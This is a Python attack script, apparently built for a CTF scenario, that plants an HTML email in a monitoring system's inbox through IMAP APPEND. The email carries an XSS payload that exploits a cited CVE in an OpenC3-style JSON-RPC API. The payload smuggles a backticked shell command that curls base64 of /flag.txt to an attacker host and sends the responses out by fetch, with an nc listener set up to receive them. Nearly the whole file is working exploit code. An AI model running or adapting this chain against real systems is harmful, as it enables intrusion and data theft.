#!/usr/bin/env python3
"""
XSS 페이로드를 관제 시스템 이메일 수신함에 직접 주입하는 공격자 스크립트.

Gmail SMTP은 onerror/script 등 XSS 패턴을 차단하므로
수신 메일함에 IMAP APPEND로 직접 주입합니다.
(실제 CTF 시나리오: 공격자가 관제 이메일 계정 또는 내부망 SMTP에 접근한 상황)

사용법:
  python3 send_xss.py \
    --imap-host imap.gmail.com \
    --imap-user pwnlab.kr@gmail.com \
    --imap-pass "xxxx xxxx xxxx xxxx" \
    --from attacker@example.com \
    --subject "긴급 공지" \
    --exfil-host YOUR_PUBLIC_IP \
    --exfil-port 4444
"""

import argparse
import imaplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

DEFAULT_IMAP_HOST = "imap.gmail.com"
DEFAULT_IMAP_PORT = 993
DEFAULT_FROM = "attacker@example.com"
DEFAULT_SUBJECT = "긴급: 시스템 점검 안내"

# CVE-2025-68271 exploit payload:
# /openc3-api/api 엔드포인트에 JSON-RPC POST 전송
# convert_to_value()가 authorize() 전에 eval()을 호출하는 취약점을 악용
XSS_TEMPLATE = """<img src=x onerror="
(function(){{
  var h='{host}',p={port};
  fetch('/openc3-api/api',{{
    method:'POST',
    headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{
      jsonrpc:'2.0',method:'cmd',id:1,
      params:[
        'DEFAULT',
        'CFS_INT CCSDS_CMD with PKTID 0x1896, CHECKSUM 0, DATA 0x00000000',
        {{'CFS_INT':{{'read_write':'[`curl http://'+h+':'+p+'/?f=$(cat /flag.txt|base64 -w0)`]'}}}}
      ]
    }})
  }}).then(r=>r.text()).then(t=>fetch('http://'+h+':'+p+'/result?d='+encodeURIComponent(t)))
   .catch(e=>fetch('http://'+h+':'+p+'/err?e='+encodeURIComponent(e)));
}})();
">"""


def inject_via_imap(
    imap_host: str,
    imap_port: int,
    imap_user: str,
    imap_pass: str,
    from_addr: str,
    subject: str,
    exfil_host: str,
    exfil_port: int,
) -> None:
    payload = XSS_TEMPLATE.format(host=exfil_host, port=exfil_port)

    msg = MIMEMultipart("alternative")
    msg["Subject"] = subject
    msg["From"] = from_addr
    msg["To"] = imap_user
    msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime())
    msg.attach(MIMEText(payload, "html"))

    raw = msg.as_bytes()

    print(f"[*] IMAP 접속: {imap_host}:{imap_port}")
    with imaplib.IMAP4_SSL(imap_host, imap_port) as imap:
        imap.login(imap_user, imap_pass)
        # INBOX에 UNSEEN 상태로 직접 주입
        result = imap.append("INBOX", "\\Seen", imaplib.Time2Internaldate(time.time()), raw)
        print(f"[*] APPEND 결과: {result}")

    print(f"[+] 주입 완료 (subject: {subject!r})")
    print(f"[*] 이메일 데몬이 30초 내 쪽지 DB로 가져옵니다.")
    print(f"[*] flag 수신 대기: nc -lvnp {exfil_port}")


def main():
    p = argparse.ArgumentParser(description="CVE-2025-68271 XSS 페이로드 IMAP 주입")
    p.add_argument("--imap-host", default=DEFAULT_IMAP_HOST)
    p.add_argument("--imap-port", type=int, default=DEFAULT_IMAP_PORT)
    p.add_argument("--imap-user", required=True, help="수신 메일함 계정 (pwnlab.kr@gmail.com)")
    p.add_argument("--imap-pass", required=True, help="수신 메일함 앱 비밀번호")
    p.add_argument("--from", dest="from_addr", default=DEFAULT_FROM, help="발신자 주소 (임의)")
    p.add_argument("--subject", default=DEFAULT_SUBJECT)
    p.add_argument("--exfil-host", required=True, help="flag를 받을 서버 IP")
    p.add_argument("--exfil-port", type=int, default=4444)
    args = p.parse_args()

    inject_via_imap(
        imap_host=args.imap_host,
        imap_port=args.imap_port,
        imap_user=args.imap_user,
        imap_pass=args.imap_pass,
        from_addr=args.from_addr,
        subject=args.subject,
        exfil_host=args.exfil_host,
        exfil_port=args.exfil_port,
    )


if __name__ == "__main__":
    main()
